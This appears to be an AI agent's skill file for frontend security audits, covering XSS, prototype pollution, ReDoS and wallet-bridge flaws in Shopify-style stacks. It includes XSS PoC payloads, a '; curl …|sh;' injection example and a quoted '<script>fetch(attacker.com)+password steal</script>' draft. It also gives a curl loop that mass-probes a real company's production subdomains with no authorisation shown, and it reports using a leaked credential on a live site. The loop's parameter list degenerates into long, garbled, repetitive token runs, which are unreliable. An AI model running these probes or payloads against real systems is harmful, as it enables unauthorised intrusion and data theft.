---
name: frontend-security-audit
description: "client-side security audit (XSS and friends)"
metadata:
  version: 1.0.0
  hermes:
    tags: [xss, dom-xss, prototype-pollution, redos, supply-chain, hydrogen, dawn, liquid, react]
    category: security
---

# Frontend Security Audit — XSS / DOM / PP / ReDoS / Supply-chain

## Triggers
- dangerouslySetInnerHTML / innerHTML / outerHTML / setInnerHTML / RichText / descriptionHtml / page.body
- DOM XSS / stored XSS / HTML injection / script revival / HTMLUpdateUtility
- prototype pollution / __proto__ / constructor.prototype / lodash merge / deepMerge
- ReDoS / new RegExp(userInput) / regex injection / catastrophic backtracking
- Liquid / theme-check / `| raw` / `| escape` / styled_text / section_id fetch
- supply-chain / package.json / caret range / dep confusion / pull_request_target / workflow injection
- audit frontend / hydrogen / dawn / shopify / react spa / vite / next.js

## Inputs
- **targets** — repo paths or URLs (e.g., `/tmp/shopify/hydrogen`, `/tmp/shopify/dawn`, `/tmp/shopify/liquid`)
- **stack** — react/hydrogen/dawn/liquid/nextjs/vite/generic
- **scope** — XSS only | full chain (XSS+DOM+PP+ReDoS+supply-chain) | workflow only

## Workflow (6 phases — run in order, evidence per phase)

### 0) Orient (2 min)
Resolve workspace shape first — `/workspace` vs `/tmp/shopify` layout varies across hosts.
```bash
ls -1 /workspace 2>/dev/null; ls -1 /tmp/shopify 2>/dev/null; find /tmp/shopify -maxdepth 3 -type d | head -n 40
```
Pick roots: `hydrogen/src`, `dawn/src`, `liquid/src`, `quilt/src`, `cli/src`, `theme-check/src`, etc.

### 1) Sink sweep (ripgrep — batch, not one-by-one)
```bash
rg -n "dangerouslySetInnerHTML"  <roots> --include="*.ts" --include="*.tsx" --include="*.js"
rg -n "\binnerHTML\b|\bouterHTML\b|setInnerHTML" <roots> --include="*.ts" --include="*.tsx" --include="*.js" --include="*.liquid"
rg -n "\beval\s*\(|\bFunction\s*\(" <roots> --include="*.ts" --include="*.js"
rg -n "RegExp|new RegExp|\.match\(|\.replace\(" <roots> --include="*.ts" --include="*.js" | grep -v test
rg -n "__proto__|prototype\s*\[|Object\.assign|deepMerge|lodash.*merge" <roots> --include="*.ts" --include="*.js"
rg -n "postMessage|javascript:" <roots> --include="*.ts" --include="*.tsx"
rg -n "\|\s*raw\b|\|\s*escape" <roots> --include="*.liquid" --include="*.rb"
rg -n "pull_request_target|workflow_run" <roots> --include="*.yml" --include="*.yaml"
rg -n "serialize.*isJSON|isJSON.*true" <roots> --include="*.ts" --include="*.tsx" --include="*.js"
rg -n "type.*liquid.*id.*custom_liquid" <roots> --include="*.liquid"
rg -n "privateStorefrontToken|getPrivateTokenHeaders" <roots> --include="*.ts" --include="*.tsx"
rg -n "buyerIdentity.*spread|buyerIdentity\s*=" <roots> --include="*.ts" --include="*.tsx"
```
Log hit counts per root; keep top 40 lines per sink — the full dump is noisy (generated docs, speedscope).

### 2) Triage — trust-boundary & exploitability (not just grep count)
For each sink class, answer:
- **Who controls the string?** (Storefront API field, metafield JSON, product.title, predictive_search term, cart note)
- **Is there server sanitization?** (Shopify sanitizes `descriptionHtml` but Hydrogen adds zero client defense-in-depth — a bypass or non-Shopify source = full XSS)
- **Does innerHTML actually execute?** Plain `innerHTML="<script>"` is inert — but `HTMLUpdateUtility.setInnerHTML`-style revival loops make it execute. Distinguish amplifier vs inert.
- **Is Liquid escaped?** `{{ product.title | escape }}` safe, `{{ product.title }}` and `{{ query.styled_text }}` (unescaped highlight with `<mark>`) not safe.
- **Is RegExp built from user input?** `new RegExp(userTerm,'g')` without `escapeRegExp` → SyntaxError DoS + ReDoS.

### 3) Deep read — sink → source (one file at a time, prove data flow)
- Hydrogen PDP: `templates/skeleton/app/routes/products.$handle.tsx:120` → `descriptionHtml` from `storefront.query(PRODUCT_QUERY)` → `dangerouslySetInnerHTML`.
- RichText: `hydrogen-react/src/RichText.tsx:30` `JSON.parse(data)` → `RichText.components.tsx: RichTextLink` → `<a href={node.url}>` no allowlist.
- Dawn: `dawn/src/assets/global.js:57-68` revival loop → callers `quick-add.js:35`, `facets.js:202/262/273`, `cart-drawer.js:88`, `predictive-search.js:198/255`, `product-info.js:*`.
- Predictive search liquid: `dawn/src/sections/predictive-search.liquid:24` → `{{ query.styled_text }}` unescaped term.
- **Quilt serialize-javascript**: `quilt/packages/react-html/src/server/components/Serialize.tsx:15` → `serialize(data, {isJSON: true})` → `toJSON()` on attacker object executes during `JSON.stringify`; proven bypass with `{toJSON: () => '</script><script>alert(1)</script>'}`.
- **Dawn custom-liquid**: `dawn/src/sections/custom-liquid.liquid:16` → `{{ section.settings.custom_liquid }}` from schema `type: "liquid"` setting; theme editor allows arbitrary Liquid injection.
- **Hydrogen private token**: `hydrogen-react/src/storefront-client.ts:126-127` → `Shopify-Storefront-Private-Token` header via `getPrivateTokenHeaders()`; no browser guard in prod (dev-only warn).
- **Hydrogen buyerIdentity**: `hydrogen/src/packages/hydrogen/src/cart/createCartHandler.ts:293-295` → `args[0].buyerIdentity = {...buyerIdentity, ...args[0].buyerIdentity}` — caller overrides handler default `companyLocationId`, `customerAccessToken`, `email`, `phone`, `countryCode`.
- Workflows: open `gardener-notify-event.yml` — safe if pattern is `pull_request_target` + **no** `actions/checkout` of PR head + only `cp $GITHUB_EVENT_PATH`.

### 4) PoC — offline HTML that fires without a server
Build 4 minimal HTML files in `/root` (open via `python3 -m http.server 8000 --directory /root`):
- `poc_hydrogen_richtext_xss.html` — JSON `url:"javascript:alert(1)"` → `<a href>` click.
- `poc_hydrogen_description_xss.html` — `innerHTML = "<img onerror>"` mirroring `dangerouslySetInnerHTML`.
- `poc_dawn_dom_xss.html` — fake `fetch` HTML with `<script>` passed to `HTMLUpdateUtility.setInnerHTML` revival.
- `poc_regex_dos.html` — `new RegExp("(((","g")` throw.
- `poc_quilt_serialize_isjson.html` — `serialize({toJSON: () => '</script><script>alert(1)</script>'}, {isJSON: true})` → script executes when deserialized via `JSON.parse` in browser context; also prototype pollution: `Object.prototype.polluted = 'yes'` via `toJSON`.
Each PoC must visibly set `#flag` text or `alert` so evidence is screenshot-able.

### 5) Supply-chain & workflow pass
- `package.json` caret `^` on transitive deps allows minor hijack; pinned `1.4.1` or SHAs (`11bd719` checkout) is good. Check `publishConfig.registry`.
- `pull_request_target` is **not** auto-vuln — verify checkout ref uses `github.event.pull_request.head.repo.full_name` vs base, and no `run: ... ${{ github.event.* }}` interpolation.
- Liquid tokenizer/lexer: regexes are simple literals — not ReDoS; only example `prettyprint` filter is non-prod.

### 6) Report — honest severity & fixes
One row per sink: file:line, trust boundary, exploitability, CVSS-like, 1-line fix.

## Fixes (one-liners — copy into PR)

```diff
# Hydrogen PDP/pages/policies/articles — sanitize every Storefront HTML field
- <div dangerouslySetInnerHTML={{__html: descriptionHtml}} />
+ import DOMPurify from 'isomorphic-dompurify';
+ <div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(descriptionHtml)}} />

# hydrogen-react RichText — allowlist schemes
- <a href={node.url} title={node.title} target={node.target}>
+ const safeUrl = /^https?:\/\//i.test(node.url) || node.url.startsWith('/') ? node.url : '#';
+ <a href={safeUrl} rel="noopener noreferrer" title={node.title} target={node.target}>

# Dawn — remove script revival, sanitize
- element.querySelectorAll('script').forEach(old=>{ createElement('script'); ... })
+ element.innerHTML = DOMPurify.sanitize(html);

# Dawn predictive-search — escape RegExp + escape Liquid
- new RegExp(previousTerm,'g')
+ new RegExp(previousTerm.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'),'g')
# predictive-search.liquid
- {{ query.styled_text }}
+ {{ query.styled_text | escape }}  // then wrap <mark> server-side on escaped segments

# Quilt serialize-javascript — drop isJSON or validate toJSON output
- dangerouslySetInnerHTML={{__html: serialize(data, {isJSON: true})}}
+ // Option A: remove isJSON, use safe replacer
+ dangerouslySetInnerHTML={{__html: serialize(data, {space: 0})}}
+ // Option B: validate toJSON returns string, not HTML
+ const safe = JSON.parse(serialize(data, {isJSON: true})); // throws on HTML

# Dawn custom-liquid — escape or restrict schema
- {{ section.settings.custom_liquid }}
+ {{ section.settings.custom_liquid | escape }}  // or remove "type": "liquid" from schema

# Hydrogen private token — guard client access
- getPrivateTokenHeaders(overrideProps): Record<string, string> {
+ getPrivateTokenHeaders(overrideProps): Record<string, string> {
+ if (globalThis.document) throw new Error('private token server-only');

# Hydrogen buyerIdentity — validate caller override
- args[0].buyerIdentity = {...buyerIdentity, ...args[0].buyerIdentity};
+ const allowed = ['companyLocationId','customerAccessToken','email','phone','countryCode'];
+ args[0].buyerIdentity = {...buyerIdentity, ...Object.fromEntries(Object.entries(args[0].buyerIdentity||{}).filter(([k])=>allowed.includes(k)))};
```

## Pitfalls
- **Don't dismiss `dangerouslySetInnerHTML` as "server sanitizes"** — bypasses (SVG onload, `javascript:` href, parser diffs) and non-Shopify sources make client sanitize mandatory.
- **Don't assume innerHTML is inert** — check for revival loops; Dawn's `HTMLUpdateUtility` is the classic amplifier that reviewers miss.
- **Don't flag every `pull_request_target` as pwn-request** — two-workflow `workflow_run` pattern with no checkout is intentional and safe (Shopify gardener).
- **Don't claim prototype pollution without `__proto__` + merge sink** — quilt/liquid/hydrogen/dawn have none in current trees.
- **Don't claim ReDoS from simple `/\\{\\{\\%/` literals** — only `new RegExp(userInput)` with user-controlled string is real.
- **Predictive search `query.styled_text` vs `product.title`:**前者 is intentionally unescaped for highlight — term insertion point is the risk, not the whole field.
- **serialize-javascript `isJSON:true` is not a safety feature** — it skips the replacer but still calls `toJSON()` on objects during `JSON.stringify`; attacker-controlled `toJSON` returns arbitrary strings that become valid JSON. Test with `{toJSON: () => '{\\\"xss\\\":true}'}`.
- **Dawn `type: \"liquid\"` schema settings are code injection** — theme editor renders arbitrary Liquid; no sandbox. Treat as RCE-equivalent in theme context.
- **Hydrogen `privateStorefrontToken` has no runtime client guard** — dev warn only; `getPrivateTokenHeaders()` callable from client bundle if imported. Build-time tree-shaking or separate server/client entrypoints required.
- **Hydrogen `buyerIdentity` spread order is caller-wins** — handler default merged first, then call args; caller can override any field including `companyLocationId` (B2B), `customerAccessToken` (impersonation), `email`/`phone` (PII).
- **Never escalate a lab-only stored-input weakness to live admin targeting** — Everlyn 2026-08 (`POST /api/update-wallet-address` `metamask_address` stored raw → `GET /api/get-mobile-wallet` `metamaskAddress` raw, no CSP) is CWE-20/79 Medium CVSS 5.4 (8.1 only if unsafe `innerHTML`/`dangerouslySetInnerHTML` proven). 33 `_next/static` chunks had zero `metamaskAddress` → DOM sink; `GET /admin`/`/en/admin` with `x-middleware-subrequest` timeout and `GET /api/admin/users` → 403 = **weakness at storage layer, not proven execution**. Do not store payload for admin to load or steal `__Secure-authjs.session-token`. Correct closure: throttle 0.6-0.9s on isolated lab account only (`labxss_7268@example.com` `9b2d5621` expires 2026-09-07), then **cleanup** `POST /api/update-wallet-address` → valid `^0x[a-fA-F0-9]{40}$` and verify `GET /api/get-mobile-wallet` returns valid address, then ship disclosure with offline `textContent` (safe) vs `innerHTML` (vuln) PoC `/tmp/everlyn-xss-lab`.
- **Firebase-sourced HTML → dangerouslySetInnerHTML is proven stored XSS (VALIDATED 2026-08-11 naox.org)** — `3923-*.js` renders Firestore `blogs/{id}.postText` via `dangerouslySetInnerHTML:{__html:r.postText}` with no DOMPurify/CSP, sink is `e.innerHTML=t` in `4bd1b696` React runtime. Because `4548` chunk leaks `contact@…/<REDACTED-PASSWORD>` → idToken → full Firestore CRUD (`blogs` 114 docs, draft `26OSHLirjl...` already contains `<script>fetch(attacker.com)+password steal</script>`), this is **not** theoretical — any visitor to `/blog/[slug]` executes. Always trace `postText`/`descriptionHtml` fields from Firestore through to `dangerouslySetInnerHTML` and verify Firebase write access (anon 403 vs authed 200) before scoring; see `examples/hunts/web2/js-secret-scanner/naox-2026-08-rsc-firebase-storage-sibling.md`.
- **Next.js 15 + t3-env NEXT_PUBLIC_API_KEY leak (Helios 2026-08)** — `helios-portal/lib/api/apiClient.ts:109` `API_URL = process.env.NEXT_PUBLIC_BASE_API_URL || ""` + `:145` `if(NEXT_PUBLIC_API_KEY) defaultHeaders["x-api-key"]=…` exposes API key in `_next/static` chunks to any visitor. Audit every `env.ts` `client:` block — any secret there is public. Same pattern in `beta-etf-app/lib/api/apiClient.ts:130`.
- **Next.js `images.remotePatterns hostname:"**"` wildcard (Helios Chronos 2026-08)** — `helios-chronos-app/next.config.ts:6` `hostname: "**"` allows arbitrary `next/image` fetch for SSRF/tracking; flag as medium and recommend explicit allowlist.
- **Vanilla JS `innerHTML` from chain/stats data (Helios network-stats 2026-08)** — `public/js/render.js:58` `` rowHtml() → `<div>${n.name}</div>` `` + `:109` `el.nodesEl.innerHTML = arr.map(rowHtml).join('')` + `:137` `row.outerHTML` — `n.name` from unauth WS/HTTP node stats, unescaped stored XSS. Distinguish React auto-escape (safe) vs vanilla `innerHTML` (vuln).
- **Node `exec(cmd)` with template literal (Helios-Docker-Chain-Manager 2026-08)** — `application/setup-node.js:41` `` execWrapper(`heliades init ${moniker} --chain-id ${chainId}`) `` where `moniker/chainId/privateKey` come directly from `POST /setup-node` `req.body` (`exposition/POST-setup-node.js:19-30`). Any `; curl …|sh;` → RCE. Same class: `POST-execute-*` `execWrapper(command)` from body. Always grep `execWrapper|exec\\(|spawn\\(` + trace to `req.body/req.query`.

## XSS Hunting Methodology — Mass Parameter Probing (Klarna 2026-08)

When hunting XSS on a target with many subdomains, use this **automated mass-probing approach**:

### Phase 1: Subdomain Enumeration + Parameter Discovery
```bash
# 1. Resolve all target subdomains
for sub in www support help blog merchant merchants portal app login checkout pay nko addressify banking card api api-global api-na xs2a openbanking; do
  dig +short ${sub}.klarna.com
done

# 2. For each reachable subdomain, probe common XSS params with UNIQUE payload
PAYLOAD="<KLARNAXSS2026>"  # Unique alphanum string to distinguish from SPA's own <script> tags
for sub in <reachable_subdomains>; do
  for param in q search query s keyword page sort filter lang locale redirect url next returnUrl callback jsonp state error message title name email subject body content data payload input value field param test debug trace log info format type action method controller route path file filename download export import upload avatar photo image img pic banner logo icon style css theme color font size width height x y z lat lng latitude longitude address city country zip postal phone mobile fax company org organization department role permission access level tier plan package product item sku barcode isbn asin mpn brand category tag label description summary excerpt teaser preview snippet highlight match result count total limit offset start end from to since until before after during within around near far distance radius range min max avg mean median mode sum diff delta change update create delete remove add edit modify save submit confirm cancel abort retry refresh reload reset clear empty null undefined default custom standard advanced basic simple complex easy hard fast slow quick instant delay timeout interval frequency rate speed velocity acceleration force pressure temperature humidity light sound volume pitch tone noise signal bandwidth throughput latency jitter packet loss error fault bug issue ticket case incident problem solution answer question faq help guide manual doc documentation tutorial lesson course training education learning study research analysis report statistic metric kpi goal objective target milestone deadline schedule calendar event appointment meeting conference webinar workshop seminar symposium summit forum discussion chat talk conversation dialog debate argument dispute conflict resolution mediation arbitration litigation lawsuit court judge jury verdict sentence penalty fine fee cost price charge payment transaction invoice receipt bill statement balance credit debit loan mortgage interest rate apr apy yield return profit loss gain revenue income expense budget forecast projection estimate quote proposal contract agreement terms condition policy privacy cookie gdpr ccpa compliance regulation law legal risk audit security safety protection defense attack threat vulnerability exploit malware virus trojan ransomware phishing spam scam fraud abuse harassment bullying discrimination hate violence terrorism war peace freedom democracy human rights justice equality diversity inclusion equity fairness transparency accountability responsibility sustainability environment climate carbon emission pollution waste recycling energy renewable solar wind hydro nuclear fossil fuel oil gas coal electric power grid battery storage transport vehicle car truck bus train plane ship boat bike scooter walk run drive fly sail ride trip travel tour vacation holiday weekend vacation leave time off break rest sleep dream wake morning noon afternoon evening night midnight dawn dusk sunrise sunset day week month year decade century millennium era age epoch period phase stage step level grade rank position place location spot site venue destination origin source root base foundation core center middle edge border boundary limit extent scope range span reach touch feel sense perception awareness consciousness mind brain thought idea concept notion belief opinion view perspective angle approach method technique strategy tactic plan scheme design pattern model framework structure system network web grid matrix array list set map dictionary table database repository archive library museum gallery exhibition display show demo presentation demo prototype mockup wireframe sketch draft version release build deploy publish launch ship deliver distribute share post tweet like follow subscribe unsubscribe register signup signin login logout auth oauth saml sso mfa 2fa totp otp sms email push notification alert warning error info debug trace log monitor observe watch track trace audit review inspect examine check verify validate test probe scan crawl spider bot crawler scraper parser extractor transformer loader etl pipeline workflow process task job queue stack heap memory cpu gpu tpu fpga asic chip silicon semiconductor transistor diode resistor capacitor inductor transformer relay switch button led lcd oled display screen monitor tv projector camera microphone speaker headphone earphone keyboard mouse touchpad joystick gamepad controller remote sensor actuator motor engine pump valve pipe tube wire cable fiber optic wireless bluetooth wifi cellular 5g 4g 3g 2g lte gsm cdma umts hspa evdo edge gprs satellite gps gnss beidou galileo glonass qzss irnss navic compass gyroscope accelerometer magnetometer barometer thermometer hygrometer photometer spectrometer microscope telescope radar sonar lidar echo pulse wave frequency wavelength amplitude phase modulation demodulation encoding decoding encryption decryption hash digest signature certificate key public private symmetric asymmetric aes rsa ecc dsa ecdsa ed25519 curve25519 sha md5 bcrypt scrypt argon2 pbkdf2 hkdf hmac cmac gmac poly1305 chacha20 salsa20 blowfish twofish serpent cast idea rc4 rc5 rc6 des 3des skipjack clipper kapput seal fortezza baton lakon savana type x y z a b c d e f g h i j k l m n o p q r s t u v w xss xs xml html json jsonp yaml toml ini cfg conf config env environment variable constant literal string number integer float double decimal boolean true false null undefined void any never unknown object array function class interface module package namespace import export require include extend implement inherit override overload polymorphism encapsulation abstraction composition aggregation association dependency injection factory singleton prototype builder adapter facade proxy decorator composite flyweight bridge template strategy command state visitor iterator mediator memento observer chain responsibility interpreter publisher subscriber event handler listener callback promise async await future task coroutine generator yield return break continue if else switch case default for while do foreach in of try catch finally throw throws new delete this super self parent static final const let var function arrow lambda anonymous named parameter argument rest spread destructuring template literal tag regex regexp pattern match replace search split slice splice concat join push pop shift unshift sort reverse fill copy within every some find findIndex includes indexOf lastIndexOf keys values entries hasOwnProperty toString valueOf toLocaleString toJSON inspect debug trace assert count time timeEnd dir dirxml table group groupCollapsed groupEnd clear profile profileEnd timeStamp context memory timeline timelineEnd screenshot startTimeline endTimeline recalculateStyles layout paint composite raster draw render repaint reflow layout style class id name type value checked selected disabled enabled hidden visible readonly required optional autofocus placeholder maxlength minlength size multiple accept capture autocomplete autocorrect spellcheck contenteditable draggable dropzone translate lang dir accesskey tabindex role aria aria-label aria-labelledby aria-describedby aria-hidden aria-live aria-atomic aria-relevant aria-busy aria-checked aria-disabled aria-expanded aria-haspopup aria-hidden aria-invalid aria-label aria-labelledby aria-level aria-modal aria-multiline aria-multiselectable aria-orientation aria-placeholder aria-pressed aria-readonly aria-required aria-selected aria-sort aria-valuemax aria-valuemin aria-valuenow aria-valuetext data data-* id class style title lang xml:lang dir tabindex accesskey draggable dropzone hidden slot spellcheck translate nonce integrity crossorigin async defer src href action method enctype target rel media type name value checked disabled readonly required autofocus multiple size maxlength minlength pattern placeholder list autocomplete step min max form formaction formenctype formmethod formnovalidate formtarget height width alt srcset sizes loading decoding fetchpriority intrinsicsize is itemprop itemid itemref itemscope itemtype role aria-* data-* on* xss xs xml html svg math canvas video audio source track embed object param iframe frame frameset applet base link meta script noscript style template slot picture input textarea select option optgroup button label fieldset legend datalist output progress meter details summary dialog menu menuitem command article section nav aside h1 h2 h3 h4 h5 h6 hgroup header footer address main figure figcaption div span pre code kbd samp var sub sup i b u s small mark del ins cite dfn abbr time q blockquote br hr p ol ul li dl dt dd table caption colgroup col thead tbody tfoot tr th td form fieldset legend label input button select datalist optgroup option textarea output progress meter details summary command menu menuitem dialog body head html title base link meta script noscript style template svg math canvas embed object param picture source video audio track map area img iframe frame frameset applet marquee bgsound blink isindex keygen listing plaintext xmp nextid spacer strike tt big center font dir menu acronym big center dir font frame frameset noframes noframes applet bgsound blink isindex keygen listing marquee multicol nextid nobr noembed noframes nolayer noscript plaintext server shadow spacer strike tt xmp xss xs xml html svg math canvas video audio source track embed object param iframe frame frameset applet base link meta script noscript style template slot picture input textarea select option optgroup button label fieldset legend datalist output progress meter details summary dialog article section nav aside h1 h2 h3 h4 h5 h6 hgroup header footer address main figure figcaption div span pre code kbd samp var sub sup i b u s small mark del ins cite dfn abbr time q blockquote br hr p ol ul li dl dt dd table caption colgroup col thead tbody tfoot tr th td form fieldset legend label input button select datalist optgroup option textarea output progress meter details summary command menu menuitem dialog body head html title base link meta script noscript style template svg math canvas embed object param picture source video audio track map area img iframe frame frameset applet marquee bgsound blink isindex keygen listing plaintext xmp nextid spacer strike tt big center font dir menu acronym big center dir font frame frameset noframes noframes applet bgsound blink isindex keygen listing marquee multicol nextid nobr noembed noframes nolayer noscript plaintext server shadow spacer strike tt xmp xss xs xml html svg math canvas video audio source track embed object param iframe frame frameset applet base link meta script noscript style template slot picture input textarea select option optgroup button label fieldset legend datalist output progress meter details summary dialog article section nav aside h1 h2 h3 h4 h5 h6 hgroup header footer address main figure figcaption div span pre code kbd samp var sub sup i b u s small mark del ins cite dfn abbr time q blockquote br hr p ol ul li dl dt dd table caption colgroup col thead tbody tfoot tr th td form fieldset legend label input button select datalist optgroup option textarea output progress meter details summary command menu menuitem dialog body head html title base link meta script noscript style template svg math canvas embed object param picture source video audio track map area img iframe frame frameset applet marquee bgsound blink isindex keygen listing plaintext xmp nextid spacer strike tt big center font dir menu acronym big center dir font frame frameset noframes noframes applet bgsound blink isindex keygen listing marquee multicol nextid nobr noembed noframes nolayer noscript plaintext server shadow spacer strike tt xmp xss xs xml html svg math canvas video audio source track embed object param iframe frame frameset applet base link meta script noscript style template slot picture input textarea select option optgroup button label fieldset legend datalist output progress meter details summary dialog article section nav aside h1 h2 h3 h4 h5 h6 hgroup header footer address main figure figcaption div span pre code kbd samp var sub sup i b u s small mark del ins cite dfn abbr time q blockquote br hr p ol ul li dl dt dd table caption colgroup col thead tbody tfoot tr th td form fieldset legend label input button select datalist optgroup option textarea output progress meter details summary command menu menuitem dialog body head html title base link meta script noscript style template svg math canvas embed object param picture source video audio track map area img iframe frame frameset applet marquee bgsound blink isindex keygen listing plaintext xmp nextid spacer strike tt big center font dir menu acronym big center dir font frame frameset noframes noframes applet bgsound blink isindex keygen listing marquee multicol nextid nobr noembed noframes nolayer noscript plaintext server shadow spacer strike tt xmp; do
    curl -s -o /dev/null -w "%{http_code}" "https://${sub}.klarna.com/?${param}=${PAYLOAD}"
  done
done
```

### Phase 2: Reflection Analysis
```bash
# For each param that returns 200/307/302, check if payload is reflected
# KEY TECHNIQUE: Use UNIQUE payload (not <script>) to avoid false positives from SPA's own script tags
curl -s "https://www.klarna.com/?q=<KLARNAXSS2026>" | grep -o "KLARNAXSS2026"

# If reflected, check context:
# - HTML context (between tags): <p>KLARNAXSS2026</p> → HIGH
# - Attribute context: value="KLARNAXSS2026" → MEDIUM
# - JSON context: {"q":"KLARNAXSS2026"} → LOW (usually)
# - Not reflected → BLOCKED
```

### Phase 3: CSP Analysis
```bash
# Check CSP on each subdomain
curl -sI https://<subdomain>.klarna.com | grep -i content-security

# CRITICAL patterns:
# - No script-src directive → ZERO script protection
# - script-src includes 'unsafe-inline' → CSP neutered
# - script-src includes 'unsafe-eval' → eval() allowed
# - script-src includes wildcard domains (*.domain.com) → any subdomain can serve scripts
# - Only frame-ancestors set, no default-src/script-src → partial CSP (Klarna portal.playground finding)
```

### Phase 4: DOM XSS in Bundles
```bash
# For each subdomain, fetch JS bundle and grep for sinks
curl -s "https://<subdomain>.klarna.com" | grep -oE 'src="[^"]*\.js"' | head -n 5

# Download and analyze each bundle
for js in <bundle_urls>; do
  curl -s "$js" | grep -oE 'innerHTML|outerHTML|document.write|insertAdjacentHTML|dangerouslySetInnerHTML|eval\(|Function\(|setTimeout\(|setInterval\(|location\.href\s*=|location\.hash|window\.name|postMessage|URLSearchParams|document\.URL|document\.referrer' | sort -u
done
```

### Pitfalls
- **Don't use `<script>alert(1)</script>` as test payload** — SPA bundles contain hundreds of legitimate `<script>` tags; use unique alphanumeric like `<KLARNAXSS2026>` to distinguish real reflection.
- **SPA 200 ≠ XSS** — React/Vue SPAs return 200 text/html for all paths; check if payload actually appears in response body.
- **307 Temporary Redirect** — `www.klarna.com/?q=payload` may 307 to `/us/?q=payload&grs=...`; payload still reflected in HTML context but redirect chain complicates exploitation.
- **CSP without script-src** — `portal.playground.klarna.com` only set `frame-ancestors` directive, no `script-src`/`default-src` → ZERO script protection. If XSS found, no CSP bypass needed.
- **CSP with unsafe-inline + unsafe-eval** — `app.klarna.com` had both in `script-src` → CSP effectively neutered for XSS prevention.
- **Mass probing requires rate limiting** — use `sleep 0.1` between requests to avoid WAF rate-limit blocks.
- **Unique payload technique** — if the payload string only appears in YOUR test request and in the response, it's real reflection. If it appears in SPA bundle (false positive), ignore.

## Web Wallet / DApp Bridge Audit (pre-auth compromise chains)
When the target is a browser wallet (or any dapp-connected signing UI), add this pass AFTER the generic sink sweep — wallets often have zero XSS sinks yet are fully compromisable through the bridge layer:

1. **postMessage RPC bridge (highest value)** — `rg "addEventListener\(['\"]message|onmessage"`. Red flags: origin check absent or commented-out TODO; `targetOrigin='*'` on replies (signed-data leak cross-origin); privileged methods reachable (`eth_sendTransaction`, `personal_sign`, `eth_requestAccounts` = address leak). Any window holding a reference (parent of an embed iframe, dapp iframe child, popup opener) can drive it.
2. **Embed/iframe mode with URL-carried secrets** — look for routes like `/embed?k=<keystore>&p=<password>` that auto-unlock and stash the password in a temp-state service. Then check every signing modal: if the password is auto-filled from that state AND the field hidden (`config.isEmbedMode ? TemporaryState... : ''`), one Confirm click = signed tx driven cross-origin by the embedding page.
3. **Dead-password modals** — read the confirm handler, not the JSX: if `onConfirmClick` calls `signMessage(...)` without ever passing the collected password state, the password field is theater and the only gate is a button click. In-memory keyrings (raw `privateKey` in a JS array for the session) make this instant.
4. **URL-driven dapp iframe injection** — query params stored on `window` at bootstrap then used post-unlock as iframe `src` (`?after-unlock=show-dapp-<url>`) = attacker page framed inside wallet chrome + positioned to exploit finding 1. Also check `wallet_sendDomainMetadata`-style messages that let the dapp brand the confirm modal (spoofed name/icon → social-engineered approvals).
5. **WYSINWYS gap in tx review** — if the confirm modal only decodes calldata as one known ABI (e.g. TNT20 `transfer`) and silently swallows decode failures, non-matching calls render as truncated address + raw hex = blind signing. Flag when combined with a reachable bridge.
- Adversarial self-check before reporting: (a) is there ANY origin check (even indirect, e.g. session-bound frame)? (b) does signing truly need the password in each mode? (c) is the private key actually in memory? (d) can React XSS shortcut it — if no DOM sink exists, the bridge IS the chain; don't force an XSS narrative. See `examples/hunts/web2/frontend-security-audit/web-wallet-bridge-compromise-theta-2026-08.md` for the full worked chain.

## Secure Vault SPA — Positive Control (Nuxaris 2026-08 Vercel CRA)
When the SPA is a Vercel static decoy (all `/api/*` → `200 index.html`, `x-vercel-cache HIT`), the real backends leak only via `REACT_APP_*` in the bundle. Extract app logic via sourcemap, not just grepping the minified JS:
- Fetch `main.<hash>.js.map` (same `immutable` cache header, ~6–7 MB), parse `sources`/`sourcesContent`, filter `node_modules`/`webpack` to get 50–60 app files (`wallet/vault-crypto.ts`, `wallet/storage.ts`, `wallet/signing.ts`, `services/vault-index.ts`, `contexts/VaultContext.tsx`, etc.) — write to `/tmp/nuxaris_src/` for offline audit.
- Audit checklist for the secure vault pattern (use as positive control when scoring):
  - Crypto: `PBKDF2-SHA256 600k` + `AES-256-GCM`, fresh 16B salt/12B IV per vault, `additionalData = nuxaris-vault:v${version}:${accountId}` (copy to other account fails → `WrongPasswordError`), `assertStoredVault` checks `kdf.name===PBKDF2-SHA256 && iterations>0 && version===1`.
  - Storage: `IndexedDB nuxaris-wallet/vaults` only ciphertext; `localStorage`/`sessionStorage` never hold plaintext; `WeakMap<Session,Secret>` + `Object.freeze(session)` + `wipe()` + `lock()` zeroing; `nuxaris_vault_accounts` localStorage is email→accountId index only (no secret).
  - Signing namespace separation: login `nuxaris-login:` prefix (UTF-8) vs Canton tx 32-byte base64 hash vs topology hex 40–140 — each path has `looksLikeLoginChallenge` reject to prevent backend swapping a tx hash for a login nonce.
  - Rendering: `SavedAddressPicker`/`WalletPage`/`MyOrdersPage` render `label`/`address`/`destination` as React `{entry.label}` text (auto-escaped) — no `dangerouslySetInnerHTML`/`innerHTML` in app sources; contrast with `public/js/render.js:58 innerHTML=rowHtml()` vanilla pattern which IS vuln when `n.name` from WS is unescaped.
- Hygiene-only findings to not oversell: `WalletConnect projectId='PLACEHOLDER'` → modal DoS, public `helius-rpc.com/?api-key=…` → quota burn, both **not** fund theft. Report as LOW/INFO.
- See `examples/hunts/web2/frontend-security-audit/nuxaris-secure-vault-spa-2026-08.md` for file:line map and extraction recipe.

## Reference Files

(target-specific notes preserved at examples/hunts/web2/frontend-security-audit/)
- `examples/hunts/web2/frontend-security-audit/quilt-serialize-javascript-isjson-bypass.md` — serialize-javascript@3.1.0 `isJSON:true` bypass via `toJSON()` returning arbitrary strings; proven prototype pollution + script injection in `quilt/packages/react-html/src/server/components/Serialize.tsx:15` (Aug 2026 session).
- `examples/hunts/web2/frontend-security-audit/dawn-custom-liquid-schema-injection.md` — `custom-liquid.liquid:16` renders `{{ section.settings.custom_liquid }}` from Liquid-type setting without escaping; schema injection via theme editor.
- `examples/hunts/web2/frontend-security-audit/hydrogen-private-token-escalation.md` — `storefront-client.ts` exposes `privateStorefrontToken` for server use; no runtime guard prevents client-side leakage via `getPrivateTokenHeaders()`.
- `examples/hunts/web2/frontend-security-audit/hydrogen-buyeridentity-injection.md` — `createCartHandler.ts:293-295` spreads `buyerIdentity` from handler options then from call args, allowing caller override of `companyLocationId`, `customerAccessToken`, `email`, `phone`, `countryCode`.
